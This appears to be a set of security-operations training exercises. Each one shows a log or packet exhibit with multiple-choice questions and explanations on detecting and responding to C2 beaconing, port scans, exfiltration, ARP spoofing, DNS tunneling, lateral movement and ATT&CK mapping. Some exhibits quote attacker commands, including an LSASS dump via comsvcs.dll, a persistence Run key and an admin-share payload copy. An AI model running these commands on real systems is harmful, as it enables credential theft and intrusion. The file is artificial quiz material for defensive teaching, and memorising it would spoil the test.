fields.explain: Human/browser HTTPS is irregular in timing and size and is preceded by DNS; the metronomic interval, uniform bytes, hardcoded IP, and malicious JA3 reveal automated C2.

fields.label: Best detection/response action?
fields.hint: Cut the channel and investigate the host.
options: Block/sinkhole 194.5.249.18, isolate 10.12.4.31, and hunt for the implant and other beaconing hosts
fields.explain: Block the C2 destination, isolate the beaconing host, and sweep for the implant and additional victims sharing the JA3/IP; allowlisting would assist the attacker.

summary: Fixed-interval, uniform-size TCP 443 connections to a hardcoded IP with a Cobalt Strike JA3 is C2 beaconing. Block/sinkhole the destination, isolate the host, and hunt for the implant and other beaconing systems.

title: Port Scan in a tcpdump Summary
brief: An IDS sensor logged a burst of TCP SYN packets from one source to many destination ports on a single host. Analyze the tcpdump summary and classify the activity.
exhibit: 198.51.100.66.51002 > 10.50.1.9.21: Flags [S], seq ... 198.51.100.66.51003 > 10.50.1.9.22: Flags [S], seq ... 198.51.100.66.51004 > 10.50.1.9.23: Flags [S], seq ... 198.51.100.66.51005 > 10.50.1.9.25: Flags [S], seq ... ... SYN to ports 21,22,23,25,53,80,110,139,443,445,3389 in 0.4s ... 10.50.1.9 replies [R.] (RST) on most ports; [S.] (SYN-ACK) on 22 and 443 No completed 3-way handshakes; sender sends RST after SYN-ACK

fields.label: What activity is shown?
fields.hint: Many ports, SYN only, no full handshake.
options: A TCP SYN (half-open) port scan probing many ports
fields.explain: One source sending SYNs to many ports in under a second, then tearing down with RST instead of completing handshakes, is a SYN/half-open port scan enumerating open services.

fields.label: Which ports responded as OPEN?
fields.explain: Ports that reply with SYN-ACK ([S.]) are open/listening; here 22 and 443 returned SYN-ACK while the rest returned RST (closed).

fields.label: Why does a RST reply indicate a CLOSED (not filtered) port?
options: RST means the port is open
A RST means the host actively refused the connection (port closed); a filtered port typically gives no reply
RST means the packet was dropped by a firewall
fields.explain: An active RST shows the host received the SYN and refused it (closed). A firewalled/filtered port usually drops the packet silently, yielding no response at all.

fields.label: Best detection/response action?
fields.hint: It is reconnaissance against a server.
options: Treat as reconnaissance: alert/log, consider rate-limiting or blocking 198.51.100.66, and verify only intended services (22/443) are exposed
Open all ports to confuse the scanner
fields.explain: Port scanning is reconnaissance preceding attack; respond by alerting, optionally blocking/rate-limiting the source, and confirming the host exposes only the intended 22/443 services with the rest firewalled.

summary: A one-to-many SYN burst with RST teardown is a half-open port scan; SYN-ACK on 22 and 443 marks them open while RSTs mark closed ports. Alert, consider blocking the source, and verify only intended services are exposed.

title: Suricata Alert for Data Exfiltration
brief: A Suricata sensor fired on a large, sustained outbound transfer to an unfamiliar host. Read the alert and flow record to determine the indicator and response.
exhibit: [**] [1:2027001] ET POLICY Large Outbound Data Transfer to Cloud Storage [**] src=10.7.3.55:50410 -> dst=185.199.110.153:443 proto=TCP app=tls flow: bytes_toserver=4,812,003,210 bytes_toclient=18,402 duration=2h11m TLS SNI: backup-files.pages.dev cert CN=*.pages.dev baseline: this finance host normally sends < 50 MB/day outbound data flowed mostly one-way (upload), off-hours 01:00-03:11

fields.label: Which indicator best fits this flow?
options: Data exfiltration: a ~4.8 GB one-way outbound upload far above baseline, off-hours
fields.explain: Nearly 4.8 GB sent to the server with almost nothing returned, off-hours and vastly above the host's ~50 MB/day baseline, indicates bulk data exfiltration.

fields.label: Why is the asymmetry (bytes_toserver >> bytes_toclient) significant?
options: Far more bytes leaving than returning is the signature of data being uploaded/exfiltrated, not normal browsing/download
fields.explain: Normal browsing/downloads pull more data in than out; ~4.8 GB out vs. 18 KB in is a one-way upload pattern characteristic of exfiltration.

fields.label: Why does TLS to a *.pages.dev host complicate detection?
options: The content is encrypted and the destination is a reputable-looking cloud/CDN domain, so it evades simple reputation and content filters
pages.dev is always blocked by default
fields.explain: Encryption hides the payload and using a trusted cloud/CDN domain (pages.dev) lets exfiltration blend with legitimate traffic, defeating naive reputation/DLP filtering on content alone.

fields.label: Best detection/response action?
fields.hint: Stop the transfer and preserve evidence.
options: Allow the transfer to finish, then review
Block the destination, isolate 10.7.3.55, preserve flow/PCAP evidence, and investigate what data left
Increase the byte threshold to silence the rule
fields.explain: Contain by blocking the destination and isolating the host to stop further egress, preserve flow/PCAP evidence, and scope what data was exfiltrated; letting it finish maximizes loss.

summary: A ~4.8 GB off-hours one-way TLS upload to a cloud domain, far above baseline, is data exfiltration. Block the destination, isolate the host, preserve flow/PCAP evidence, and determine what data left.

title: ARP Spoofing on the Local Segment
brief: Users on a VLAN report intermittent connectivity and the gateway MAC keeps changing. A packet capture from a monitoring port shows conflicting ARP replies.
exhibit: Gateway 10.30.0.1 legitimate MAC = 00:1a:2b:3c:4d:5e ARP reply: 10.30.0.1 is-at aa:bb:cc:00:11:22 (from host 10.30.0.66) ARP reply: 10.30.0.1 is-at aa:bb:cc:00:11:22 (gratuitous, every 2s) Two MACs now claim 10.30.0.1; client ARP caches updated to aa:bb:cc:00:11:22 10.30.0.66 forwarding traffic onward to real gateway (IP forwarding enabled) Result: traffic for the gateway transits 10.30.0.66 first

fields.label: Which attack is occurring?
fields.hint: Two MACs claim one gateway IP, gratuitous ARPs.
options: ARP spoofing/poisoning to enable a man-in-the-middle
fields.explain: An attacker host is sending forged/gratuitous ARP replies mapping the gateway IP to its own MAC, poisoning client caches so traffic flows through it, a classic ARP-spoofing MITM.

fields.label: What is the attacker's likely goal given IP forwarding is on?
fields.hint: Traffic transits the rogue host first.
options: Man-in-the-middle interception/eavesdropping of traffic while still forwarding it onward
fields.explain: With IP forwarding enabled the rogue host relays traffic to the real gateway, so victims keep connectivity while the attacker silently intercepts (and could modify) their traffic.

fields.label: Why does ARP spoofing succeed on the local segment?
options: ARP has no authentication, so hosts accept unsolicited/gratuitous replies and update their caches
fields.explain: ARP is stateless and unauthenticated; hosts trust any reply (including gratuitous ones) and update their cache, letting an attacker bind the gateway IP to their MAC.

fields.label: Best detection/response control?
options: Enable Dynamic ARP Inspection (with DHCP snooping) and port security; isolate 10.30.0.66
Open more ports on the switch
fields.explain: Dynamic ARP Inspection (paired with DHCP snooping) validates ARP against trusted bindings and drops spoofed replies; combine with port security and isolate the offending host 10.30.0.66.

summary: Forged gratuitous ARP replies binding the gateway IP to the attacker's MAC is ARP-spoofing MITM (traffic relayed onward via IP forwarding). Deploy Dynamic ARP Inspection with DHCP snooping/port security and isolate the rogue host.

title: DNS Tunneling Indicators
brief: A NetFlow and DNS log review found a single internal host generating an abnormal volume of long, high-entropy DNS queries to one authoritative domain. Classify and respond.
exhibit: q: a8f3k2j9d7s1l4.tunnel-svc.net type=TXT len=63 q: zx91qp04mn28rt.tunnel-svc.net type=TXT len=63 q: 7h2gv5cb9wq3la.tunnel-svc.net type=TXT len=63 ... 9,400 unique subdomains to tunnel-svc.net in 20 minutes ... avg query length 58 bytes (normal ~20); responses are large TXT records tunnel-svc.net authoritative NS hosted on a VPS in a high-risk ASN volume: this host issued 70% of all DNS traffic on the segment

fields.label: Which indicator best describes this?
fields.hint: High volume, long random subdomains, TXT records.
options: DNS tunneling: encoding data in many long, high-entropy subdomain queries to one domain
fields.explain: Thousands of unique, long, high-entropy subdomains and large TXT responses to a single domain is the signature of DNS tunneling, using DNS as a covert data channel.

fields.label: Why is TXT-record use notable here?
options: TXT records can hold arbitrary text, making them a convenient carrier for tunneled/encoded payloads
fields.explain: TXT records can contain large arbitrary strings, so tunneling tools use them to carry encoded data in responses, far more than typical A-record lookups.

fields.label: Which port/protocol is the covert channel using?
options: UDP/TCP 53 (DNS), which is rarely blocked outbound
fields.explain: The tunnel rides standard DNS on port 53; because DNS egress is almost always allowed and inspected loosely, it is an attractive covert channel.

fields.label: Best detection/response action?
fields.hint: Block the domain and tighten DNS egress.
options: Block/sinkhole tunnel-svc.net, force clients through inspected internal resolvers, alert on high-entropy/long-query rates, and isolate 10.4.9.12
fields.explain: Sinkhole the tunneling domain, require internal resolver use with logging/inspection, baseline-alert on query length/entropy/volume, and isolate the offending host to cut the channel.

summary: Thousands of long, high-entropy TXT subdomain queries to one domain over port 53 is DNS tunneling. Sinkhole the domain, force inspected internal resolvers, alert on query-length/entropy anomalies, and isolate the host.

title: Snort Alert for SMB Lateral Movement
brief: A Snort sensor between segments alerted on an internal host authenticating to many peers over SMB with admin shares in rapid succession. Determine the indicator and response.
exhibit: [1:1000455] INTERNAL SMB ADMIN$ access burst from single source 10.20.5.40 -> 10.20.5.41:445 SMB2 TREE_CONNECT \\10.20.5.41\ADMIN$ 10.20.5.40 -> 10.20.5.42:445 SMB2 TREE_CONNECT \\10.20.5.42\ADMIN$ 10.20.5.40 -> 10.20.5.43:445 SMB2 service create svc=PSEXESVC ... 28 hosts contacted on 445 in 90s, all ADMIN$/svcctl ... auth: same domain account 'svc_helpdesk' used across all targets source 10.20.5.40 is a normal workstation, not an admin jump host

fields.label: Which behavior is indicated?
fields.hint: One source, many hosts, ADMIN$ and service creation.
options: Lateral movement: a single host reaching many peers via SMB ADMIN$ and remote service creation
fields.explain: One workstation connecting to many ADMIN$ shares and creating PSEXESVC services across 28 hosts with the same account is hands-on-keyboard lateral movement (e.g., PsExec-style).

fields.label: What port and share are central to this technique?
options: TCP 445 / ADMIN$ (administrative share used for remote execution)
fields.explain: SMB on TCP 445 with the ADMIN$ administrative share (plus svcctl/PSEXESVC) is the channel for remote service creation and code execution during lateral movement.

fields.label: Why is the source being a normal workstation significant?
fields.hint: Compare to expected admin tooling origin.
options: A regular user workstation mass-connecting to admin shares is anomalous; such activity should originate only from sanctioned admin/jump hosts
It means the traffic is safe
fields.explain: Administrative SMB sweeps should come from designated admin tooling/jump hosts; a standard workstation performing them indicates a compromised host being used to pivot.

fields.label: Best detection/response action?
fields.hint: Contain the pivot and the account.
options: Isolate 10.20.5.40, disable/reset the svc_helpdesk account, block lateral 445, and hunt the reached hosts
fields.explain: Contain by isolating the pivot host, disabling/resetting the abused service account, restricting lateral SMB, and investigating all 28 contacted hosts for compromise.

summary: One workstation hitting many ADMIN$ shares on TCP 445 with remote service creation under one account is SMB lateral movement. Isolate the pivot, disable/reset the account, restrict lateral 445, and hunt the reached hosts.

title: Mapping Observed Behavior to ATT&CK Tactics
brief: A threat hunt assembled a sequence of adversary actions on a compromised host. Map each observed behavior to the correct MITRE ATT&CK tactic to build the kill-chain picture.
exhibit: Observed behaviors, in order: 1) whoami /priv; net group "domain admins" /domain 2) reg add ...\Run key pointing to C:\Users\Public\upd.exe 3) rundll32 comsvcs.dll MiniDump lsass -> creds.bin 4) net use \\10.0.9.21\C$ /user:CORP\admin; copy upd.exe \\10.0.9.21 ATT&CK tactic mapping required

fields.label: Behavior 1 (whoami /priv, net group queries) maps to which tactic?
fields.explain: Enumerating privileges and domain group membership to learn about the environment is Discovery (e.g., Account/Permission Groups Discovery).

fields.label: Behavior 2 (Run-key registry entry) maps to which tactic?
fields.explain: Adding an autostart Run key so the payload re-executes after reboot is Persistence (Boot or Logon Autostart Execution: Registry Run Keys).

fields.label: Behavior 3 (LSASS MiniDump) maps to which tactic?
fields.explain: Dumping LSASS to obtain account credentials is Credential Access (OS Credential Dumping: LSASS Memory).

fields.label: Behavior 4 (net use to C$ + copying payload to another host) maps to which tactic?
fields.explain: Authenticating to a remote admin share and copying the payload to another host to expand the foothold is Lateral Movement (e.g., Remote Services: SMB/Windows Admin Shares).

summary: The chain maps to Discovery (priv/group enumeration), Persistence (Run key), Credential Access (LSASS dump), and Lateral Movement (admin-share copy), reconstructing the adversary's kill chain across ATT&CK tactics.

title: Placing Indicators on the Pyramid of Pain
brief: Your intel team extracted several indicators from an intrusion. Rank them by how much pain denying each causes the adversary, using David Bianco's Pyramid of Pain.
exhibit: Extracted indicators: A) MD5 hash of dropper: d41d8cd98f00b204e9800998ecf8427e B) C2 IP address: 45.61.139.8 C) C2 domain: cdn-update.win D) TTP: spearphish -> macro -> LSASS dump -> SMB lateral movement Pyramid of Pain: hash < IP < domain < network/host artifacts < tools < TTPs

fields.label: Which indicator is EASIEST for the adversary to change (least pain)?
fields.explain: A file hash sits at the bottom of the pyramid; a single byte change yields a new hash, so blocking on hash causes the adversary almost no pain.

fields.label: Which indicator causes the MOST pain to deny (top of pyramid)?
fields.explain: TTPs (the adversary's behaviors and tradecraft) are at the apex; forcing them to change how they operate is far costlier than swapping a hash, IP, or domain.

fields.label: Compared to an IP, why does denying a domain cause slightly more pain?
options: Registering/standing up new domains takes more effort than rotating an IP, so it costs the adversary a bit more
IPs are higher on the pyramid than domains
Domains and IPs are identical in cost
fields.explain: On the Pyramid of Pain, domain names sit above IP addresses: acquiring and operationalizing new domains is more effort than simply changing an IP, so denial costs the adversary more.

fields.label: Why should detections emphasize higher-pyramid indicators?
options: Detecting on tools and TTPs is more durable because adversaries cannot trivially change them, unlike hashes/IPs
Higher indicators are always false positives
fields.explain: Atomic IOCs (hashes, IPs) churn quickly, but tool and TTP-based detections endure across campaigns, giving longer-lasting defensive value despite being harder to build.

summary: On the Pyramid of Pain, hashes (least pain) sit below IPs, then domains, then artifacts/tools, with TTPs at the top (most pain). Prioritize tool/TTP-based detections because they are far more durable than atomic IOCs.

title: Judging Threat Intelligence Confidence
brief: Three intelligence inputs arrive about a possible campaign targeting your sector. Apply source reliability and corroboration to assign a confidence level before acting.
exhibit: Item 1: ISAC bulletin + your own SIEM confirm same C2 IP hitting 3 of your hosts Item 2: A single anonymous pastebin post lists 'IOCs' with no context or date Item 3: Vendor report names a TTP also seen in your EDR telemetry this week Admiralty-style grading: source reliability x information credibility Goal: weight action by confidence, avoid acting on unvetted data

fields.label: Which item warrants the HIGHEST confidence?
options: Item 1 (trusted ISAC bulletin corroborated by your own SIEM)
fields.explain: Item 1 combines a reliable, vetted source (ISAC) with first-party corroboration in your own telemetry, the strongest basis for high confidence and action.

fields.label: Why is Item 2 (anonymous pastebin) low confidence?
options: Unknown/untrusted source, no context, no date, and no corroboration, so reliability and credibility are both low
fields.explain: An anonymous, contextless, undated post from an unvetted source with no corroboration scores low on both source reliability and information credibility, so it should not drive action alone.

fields.label: What most increases confidence in an intel item?
options: Corroboration from multiple independent, reliable sources and your own telemetry
fields.explain: Confidence rises when independent, reliable sources agree and the claim is corroborated by your own internal observations, reducing the chance of error or deception.

fields.label: How should low-confidence intel (Item 2) be handled?
options: Immediately block everything it lists in production
Track/monitor it and seek corroboration before taking disruptive action
fields.explain: Low-confidence indicators are recorded and watched for corroboration rather than driving disruptive blocking, balancing diligence against false positives and potential misdirection.

summary: Confidence = source reliability x corroboration. The ISAC item confirmed in your SIEM is high confidence and actionable; the anonymous pastebin is low confidence and should be monitored for corroboration, not blindly enforced.

title: Forming a Threat Hunt Hypothesis
brief: Recent intel reports that an actor targeting your industry uses scheduled tasks for persistence and WMI for execution. Translate this into a testable, intel-driven hunt hypothesis.
exhibit: Intel: actor 'TEMP-Marlin' uses schtasks persistence + WMI lateral exec Available data: Sysmon (1,3,11,13), Windows Security, EDR process tree Crown jewels: finance file servers, AD tier-0 Hypothesis-driven (not just alert-driven) hunting Goal: a specific, falsifiable hypothesis tied to data you can query

fields.label: Which is the strongest hunt hypothesis?
options: If TEMP-Marlin is present, we will find anomalous schtasks creation (Sysmon/4698) and WMI process spawns (Sysmon 1) on or pivoting toward tier-0/finance hosts
Someone clicked a phishing email last year
fields.explain: A good hypothesis is specific and testable: it names the expected behavior (schtasks + WMI exec), the data to query (Sysmon/event IDs), and the scope (tier-0/finance), so it can be confirmed or refuted.

fields.label: What kind of hunting does this represent?
fields.hint: Driven by intel, not an alert.
fields.explain: Starting from threat intel about an actor's TTPs and proactively searching telemetry for those behaviors is hypothesis-driven, intelligence-led threat hunting.

fields.label: Which data sources best test this hypothesis?
fields.hint: Process creation and task creation events.
options: Sysmon process-creation (ID 1) and scheduled-task (ID 4698) events plus EDR process trees
fields.explain: WMI execution surfaces as process-creation (Sysmon 1) and task persistence as task-creation events (4698); paired with EDR process trees these directly test the hypothesized TTPs.

fields.label: If the hunt finds no evidence, what is the correct conclusion?
options: The hypothesis is not supported in the searched data; document findings, refine, and improve detections
Declare the actor definitely absent everywhere forever
fields.explain: A null result refutes the hypothesis within scope; you document it, refine the hypothesis or data coverage, and convert insights into detections, hunting is iterative, not pass/fail.

summary: Intel-led hunting turns actor TTPs into a specific, falsifiable hypothesis: search Sysmon 1/4698 and EDR trees for schtasks persistence and WMI execution toward tier-0/finance assets. A null result refines the hypothesis and feeds new detections.

title: Mapping a Phishing Intrusion to ATT&CK Techniques
brief: A finished-intel report describes a phishing-led intrusion. Map the key steps to specific MITRE ATT&CK techniques (not just tactics) to drive detections.
exhibit: Step A: victim receives email with malicious .docm attachment and opens it Step B: macro launches powershell -enc to download a payload Step C: payload schedules a task to run at logon for persistence Step D: actor dumps LSASS to harvest credentials Map each step to an ATT&CK technique

fields.label: Step A (malicious attachment opened) maps to which technique?
fields.explain: A weaponized email attachment that the user opens is Phishing: Spearphishing Attachment (T1566.001), an Initial Access technique.

fields.label: Step B (macro -> powershell -enc) maps to which technique?
fields.explain: Encoded PowerShell launched by a macro is Command and Scripting Interpreter: PowerShell (T1059.001), an Execution technique.

fields.label: Step C (logon scheduled task) maps to which technique?
fields.explain: Creating a scheduled task to run at logon for persistence is Scheduled Task/Job: Scheduled Task (T1053.005).

fields.label: Step D (LSASS dump) maps to which technique?
fields.explain: Dumping LSASS memory to extract credentials is OS Credential Dumping: LSASS Memory (T1003.001), a Credential Access technique.

summary: The intrusion maps to T1566.001 (spearphishing attachment), T1059.001 (PowerShell), T1053.005 (scheduled task persistence), and T1003.001 (LSASS dumping), each pointing to concrete detections across the kill chain.

title: Diamond Model and Indicator Pivoting
brief: An analyst is enriching an intrusion using the Diamond Model and wants to pivot from one known vertex to discover related infrastructure and victims. Apply the model correctly.
exhibit: Diamond Model vertices: Adversary - Capability - Infrastructure - Victim Known: Infrastructure = C2 domain cdn-update.win (resolves to 45.61.139.8) Capability: a packed loader 'upd.exe' (imphash known) Victim: three finance-sector hosts so far Goal: pivot from infrastructure to find other victims and adversary links

fields.label: The four core vertices of the Diamond Model are:
fields.explain: The Diamond Model of Intrusion Analysis links four core vertices: Adversary, Capability, Infrastructure, and Victim, connected by relationships in each event.

fields.label: Pivoting from the C2 IP (45.61.139.8) to find other domains hosted there is an example of pivoting along which vertex?
fields.explain: Resolving an IP to other domains/hosts it serves is pivoting on the Infrastructure vertex to uncover related adversary infrastructure.

fields.label: Using the loader's imphash to find other samples and affected hosts pivots on which vertex?
fields.explain: An imphash characterizes the malware (the Capability vertex); searching for it across telemetry/repositories reveals other samples and victims using the same tooling.

fields.label: Why is Diamond Model pivoting valuable to a hunt?
fields.hint: Expanding from one IOC to the whole picture.
options: Relationships between vertices let analysts expand from a single known element to discover related infrastructure, capabilities, and additional victims
It replaces the need for logs
fields.explain: Because the vertices are linked, knowing one (e.g., infrastructure) lets analysts pivot to discover associated capabilities, other victims, and ultimately adversary attribution, broadening the investigation.

summary: The Diamond Model links Adversary, Capability, Infrastructure, and Victim. Pivoting on Infrastructure (IP-to-domains) and Capability (imphash) expands a single IOC into related infrastructure, samples, and additional victims for the hunt.
